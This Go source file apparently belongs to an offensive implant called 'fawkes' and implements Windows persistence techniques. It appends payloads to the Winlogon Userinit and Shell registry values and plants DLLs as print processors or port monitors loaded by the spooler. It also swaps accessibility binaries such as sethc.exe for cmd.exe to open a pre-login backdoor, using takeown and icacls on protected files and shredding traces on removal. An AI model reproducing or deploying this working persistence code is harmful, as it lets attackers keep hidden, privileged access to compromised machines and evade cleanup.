//go:build windows
// +build windows

// persist_methods2.go implements Winlogon Helper, Print Processor, and
// Accessibility Features persistence methods for Windows.

package commands

import (
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// winlogonKeyPath is the registry path for Winlogon settings.
const winlogonKeyPath = `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

// persistWinlogon installs/removes Winlogon Helper DLL persistence (T1547.004).
// Modifies Shell or Userinit values to include the payload alongside the legitimate binary.
func persistWinlogon(args persistArgs) structs.CommandResult {
	target := strings.ToLower(args.Name)
	if target == "" {
		target = "userinit"
	}

	if target != "userinit" && target != "shell" {
		return errorf("Error: name must be 'userinit' or 'shell' for winlogon method (got '%s')", args.Name)
	}

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		key, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("Error opening HKLM\\%s: %v (admin required)", winlogonKeyPath, err)
		}
		defer key.Close()

		if target == "userinit" {
			return winlogonInstallUserinit(key, args.Path)
		}
		return winlogonInstallShell(key, args.Path)

	case "remove":
		if args.Path == "" {
			return errorResult("Error: path is required for winlogon removal (to identify the injected entry)")
		}

		key, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("Error opening HKLM\\%s: %v", winlogonKeyPath, err)
		}
		defer key.Close()

		if target == "userinit" {
			return winlogonRemoveUserinit(key, args.Path)
		}
		return winlogonRemoveShell(key, args.Path)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

func winlogonInstallUserinit(key registry.Key, payload string) structs.CommandResult {
	current, _, err := key.GetStringValue("Userinit")
	if err != nil {
		return errorf("Error reading Userinit value: %v", err)
	}

	if strings.Contains(current, payload) {
		return errorf("Error: payload already in Userinit value: %s", current)
	}

	// Userinit is comma-delimited, e.g. "C:\Windows\system32\userinit.exe,"
	trimmed := strings.TrimSpace(current)
	if !strings.HasSuffix(trimmed, ",") {
		trimmed += ","
	}
	newValue := trimmed + payload + ","

	if err := key.SetStringValue("Userinit", newValue); err != nil {
		return errorf("Error setting Userinit: %v", err)
	}

	return successf("Installed Winlogon Helper persistence (Userinit):\n  Key:       HKLM\\%s\\Userinit\n  Original:  %s\n  Modified:  %s\n  Trigger:   Runs at every user logon (winlogon.exe → userinit chain)", winlogonKeyPath, current, newValue)
}

func winlogonInstallShell(key registry.Key, payload string) structs.CommandResult {
	current, _, err := key.GetStringValue("Shell")
	if err != nil {
		return errorf("Error reading Shell value: %v", err)
	}

	if strings.Contains(current, payload) {
		return errorf("Error: payload already in Shell value: %s", current)
	}

	// Shell is comma-delimited, default: "explorer.exe"
	newValue := current + "," + payload

	if err := key.SetStringValue("Shell", newValue); err != nil {
		return errorf("Error setting Shell: %v", err)
	}

	return successf("Installed Winlogon Helper persistence (Shell):\n  Key:       HKLM\\%s\\Shell\n  Original:  %s\n  Modified:  %s\n  Trigger:   Runs at every user logon alongside explorer.exe", winlogonKeyPath, current, newValue)
}

func winlogonRemoveUserinit(key registry.Key, payload string) structs.CommandResult {
	current, _, err := key.GetStringValue("Userinit")
	if err != nil {
		return errorf("Error reading Userinit: %v", err)
	}

	cleaned := strings.Replace(current, payload+",", "", 1)
	if cleaned == current {
		cleaned = strings.Replace(current, ","+payload, "", 1)
	}
	if cleaned == current {
		return errorf("Error: payload '%s' not found in Userinit value: %s", payload, current)
	}

	if err := key.SetStringValue("Userinit", cleaned); err != nil {
		return errorf("Error restoring Userinit: %v", err)
	}

	return successf("Removed Winlogon Userinit persistence:\n  Key:    HKLM\\%s\\Userinit\n  Before: %s\n  After:  %s", winlogonKeyPath, current, cleaned)
}

func winlogonRemoveShell(key registry.Key, payload string) structs.CommandResult {
	current, _, err := key.GetStringValue("Shell")
	if err != nil {
		return errorf("Error reading Shell: %v", err)
	}

	cleaned := strings.Replace(current, ","+payload, "", 1)
	if cleaned == current {
		cleaned = strings.Replace(cleaned, payload+",", "", 1)
	}
	if cleaned == current {
		return errorf("Error: payload '%s' not found in Shell value: %s", payload, current)
	}

	if err := key.SetStringValue("Shell", cleaned); err != nil {
		return errorf("Error restoring Shell: %v", err)
	}

	return successf("Removed Winlogon Shell persistence:\n  Key:    HKLM\\%s\\Shell\n  Before: %s\n  After:  %s", winlogonKeyPath, current, cleaned)
}

// printProcessorRegBase is the registry path for print processors on x64 Windows.
const printProcessorRegBase = `SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors`

// printProcessorDir is the directory where print processor DLLs are stored.
const printProcessorDir = `C:\Windows\System32\spool\prtprocs\x64`

// persistPrintProcessor installs/removes Print Processor DLL persistence (T1547.012).
// Registers a DLL as a print processor, loaded by spoolsv.exe at service start.
func persistPrintProcessor(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "FawkesProc"
	}

	regPath := printProcessorRegBase + `\` + args.Name

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			return errorResult("Error: path is required (DLL to install as print processor)")
		}

		// Verify source DLL exists
		if _, err := os.Stat(args.Path); err != nil {
			return errorf("Error: source DLL not found: %v", err)
		}

		// Copy DLL to print processor directory
		dllName := filepath.Base(args.Path)
		destPath := filepath.Join(printProcessorDir, dllName)

		src, err := os.Open(args.Path)
		if err != nil {
			return errorf("Error opening source DLL '%s': %v", args.Path, err)
		}
		defer src.Close()

		dst, err := os.Create(destPath)
		if err != nil {
			return errorf("Error creating '%s': %v (admin required, spoolsv.exe may lock directory)", destPath, err)
		}
		defer dst.Close()

		bytes, err := io.Copy(dst, src)
		if err != nil {
			dst.Close()
			return errorf("Error copying DLL: %v", err)
		}
		if err := dst.Close(); err != nil {
			return errorf("Error finalizing DLL copy: %v", err)
		}

		// Register in registry — Driver value is just the filename
		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
		if err != nil {
			// Clean up copied DLL on registry failure
			os.Remove(destPath)
			return errorf("Error creating HKLM\\%s: %v (admin required)", regPath, err)
		}
		defer key.Close()

		if err := key.SetStringValue("Driver", dllName); err != nil {
			os.Remove(destPath)
			return errorf("Error setting Driver value: %v", err)
		}

		return successf("Installed print processor persistence:\n  Name:     %s\n  DLL:      %s → %s (%d bytes)\n  Registry: HKLM\\%s\n  Driver:   %s\n  Trigger:  Loaded by spoolsv.exe when Print Spooler starts", args.Name, args.Path, destPath, bytes, regPath, dllName)

	case "remove":
		// Remove registry key first
		shredRegistryKey(registry.LOCAL_MACHINE, regPath)

		// Remove DLL from print processor directory
		var dllPath string
		// Try to find the DLL name from path arg or scan directory
		if args.Path != "" {
			dllPath = filepath.Join(printProcessorDir, filepath.Base(args.Path))
		} else {
			// Try to read Driver value before it was shredded (best effort)
			dllPath = filepath.Join(printProcessorDir, args.Name+".dll")
		}

		if dllPath != "" {
			secureRemove(dllPath)
		}

		return successf("Removed print processor persistence:\n  Name:     %s\n  Registry: HKLM\\%s (shredded)\n  DLL:      %s (secure removed)", args.Name, regPath, dllPath)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// --- Port Monitor Persistence (T1547.010) ---

// portMonitorRegBase is the registry path for port monitors.
const portMonitorRegBase = `SYSTEM\CurrentControlSet\Control\Print\Monitors`

// persistPortMonitor installs/removes Port Monitor DLL persistence (T1547.010).
// Registers a DLL as a port monitor, loaded by spoolsv.exe at service start.
// Similar to Print Processors but uses a different registry location and DLL
// goes into System32 directly.
func persistPortMonitor(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "FawkesMon"
	}

	regPath := portMonitorRegBase + `\` + args.Name

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			return errorResult("Error: path is required (DLL to install as port monitor)")
		}

		// Verify source DLL exists
		if _, err := os.Stat(args.Path); err != nil {
			return errorf("Error: source DLL not found: %v", err)
		}

		// Port monitor DLLs are loaded from System32
		sys32 := os.Getenv("SystemRoot")
		if sys32 == "" {
			sys32 = `C:\Windows`
		}
		destDir := filepath.Join(sys32, "System32")
		dllName := filepath.Base(args.Path)
		destPath := filepath.Join(destDir, dllName)

		// Copy DLL to System32
		src, err := os.Open(args.Path)
		if err != nil {
			return errorf("Error opening source DLL '%s': %v", args.Path, err)
		}
		defer src.Close()

		dst, err := os.Create(destPath)
		if err != nil {
			return errorf("Error creating '%s': %v (admin required)", destPath, err)
		}
		defer dst.Close()

		bytes, err := io.Copy(dst, src)
		if err != nil {
			dst.Close()
			return errorf("Error copying DLL: %v", err)
		}
		if err := dst.Close(); err != nil {
			return errorf("Error finalizing DLL copy: %v", err)
		}

		// Register in registry — Driver value is just the filename
		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
		if err != nil {
			os.Remove(destPath)
			return errorf("Error creating HKLM\\%s: %v (admin required)", regPath, err)
		}
		defer key.Close()

		if err := key.SetStringValue("Driver", dllName); err != nil {
			os.Remove(destPath)
			return errorf("Error setting Driver value: %v", err)
		}

		return successf("Installed port monitor persistence:\n  Name:     %s\n  DLL:      %s → %s (%d bytes)\n  Registry: HKLM\\%s\n  Driver:   %s\n  Trigger:  Loaded by spoolsv.exe when Print Spooler starts\n  Note:     Requires admin. Restart spooler to load immediately:\n            net stop spooler && net start spooler", args.Name, args.Path, destPath, bytes, regPath, dllName)

	case "remove":
		// Try to read the Driver value before shredding, so we can clean up the DLL
		var dllName string
		if rk, err := registry.OpenKey(registry.LOCAL_MACHINE, regPath, registry.QUERY_VALUE); err == nil {
			dllName, _, _ = rk.GetStringValue("Driver")
			rk.Close()
		}

		// Shred registry key
		shredRegistryKey(registry.LOCAL_MACHINE, regPath)

		// Remove DLL from System32
		sys32 := os.Getenv("SystemRoot")
		if sys32 == "" {
			sys32 = `C:\Windows`
		}
		if dllName == "" && args.Path != "" {
			dllName = filepath.Base(args.Path)
		}
		if dllName != "" {
			dllPath := filepath.Join(sys32, "System32", dllName)
			secureRemove(dllPath)
		}

		return successf("Removed port monitor persistence:\n  Name:     %s\n  Registry: HKLM\\%s (shredded)\n  DLL:      %s (secure removed from System32)", args.Name, regPath, dllName)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// accessibilityTargets maps accessibility binaries to their trigger descriptions.
var accessibilityTargets = [][2]string{
	{"sethc.exe", "Sticky Keys — press Shift 5x at lock screen"},
	{"utilman.exe", "Ease of Access — click button at lock screen"},
	{"osk.exe", "On-Screen Keyboard — via Ease of Access"},
	{"narrator.exe", "Narrator — via Ease of Access"},
	{"magnify.exe", "Magnifier — via Ease of Access"},
}

// persistAccessibility installs/removes accessibility feature persistence (T1546.008).
// Replaces accessibility binaries in System32 with payload, providing pre-login code execution.
func persistAccessibility(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "sethc.exe"
	}

	sys32 := os.Getenv("SystemRoot")
	if sys32 == "" {
		sys32 = `C:\Windows`
	}
	targetPath := filepath.Join(sys32, "System32", args.Name)
	backupPath := targetPath + ".bak"

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			// Default to cmd.exe — the classic accessibility backdoor
			args.Path = filepath.Join(sys32, "System32", "cmd.exe")
		}

		// Verify target exists
		if _, err := os.Stat(targetPath); err != nil {
			return errorf("Error: target binary not found: %s (%v)", targetPath, err)
		}

		// Step 1: Take ownership (required for TrustedInstaller-owned files)
		if out, err := exec.Command("takeown", "/f", targetPath).CombinedOutput(); err != nil {
			return errorf("Failed to take ownership of %s: %v\nOutput: %s", targetPath, err, strings.TrimSpace(string(out)))
		}

		// Step 2: Grant Administrators full control
		if out, err := exec.Command("icacls", targetPath, "/grant", "administrators:F").CombinedOutput(); err != nil {
			return errorf("Failed to set permissions on %s: %v\nOutput: %s", targetPath, err, strings.TrimSpace(string(out)))
		}

		// Step 3: Backup original binary
		if err := copyFileSimple(targetPath, backupPath); err != nil {
			return errorf("Error backing up %s → %s: %v", targetPath, backupPath, err)
		}

		// Step 4: Replace with payload
		if err := copyFileSimple(args.Path, targetPath); err != nil {
			return errorf("Error replacing %s with %s: %v", targetPath, args.Path, err)
		}

		// Look up trigger description
		trigger := "When " + args.Name + " is launched"
		for _, t := range accessibilityTargets {
			if strings.EqualFold(args.Name, t[0]) {
				trigger = t[1]
				break
			}
		}

		return successf("Installed accessibility feature persistence:\n  Target:   %s\n  Replaced: %s\n  Backup:   %s\n  Payload:  %s\n  Trigger:  %s\n  Note:     Accessible from Windows lock screen (pre-login)", args.Name, targetPath, backupPath, args.Path, trigger)

	case "remove":
		// Restore from backup
		if _, err := os.Stat(backupPath); err != nil {
			return errorf("Error: backup not found at %s — cannot restore original binary", backupPath)
		}

		// Take ownership of the replaced binary
		exec.Command("takeown", "/f", targetPath).CombinedOutput()
		exec.Command("icacls", targetPath, "/grant", "administrators:F").CombinedOutput()

		// Secure-remove the payload copy
		secureRemove(targetPath)

		// Restore original from backup
		if err := copyFileSimple(backupPath, targetPath); err != nil {
			return errorf("Error restoring %s from backup: %v", targetPath, err)
		}

		// Clean up backup
		os.Remove(backupPath)

		return successf("Removed accessibility feature persistence:\n  Restored: %s from backup\n  Cleaned:  %s removed", targetPath, backupPath)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// copyFileSimple is defined in uac_bypass_exec.go (shared helper)
